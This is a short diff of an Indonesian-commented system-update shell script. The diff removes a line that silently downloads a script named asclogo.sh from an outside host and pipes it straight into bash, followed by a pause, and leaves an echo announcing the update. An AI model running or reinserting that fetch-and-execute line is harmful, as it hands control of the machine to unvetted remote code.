@@ -1,7 +1,4 @@
 
-curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
-sleep 2
-
 
 # Update dan upgrade sistem
 echo "Melakukan update dan upgrade sistem..."
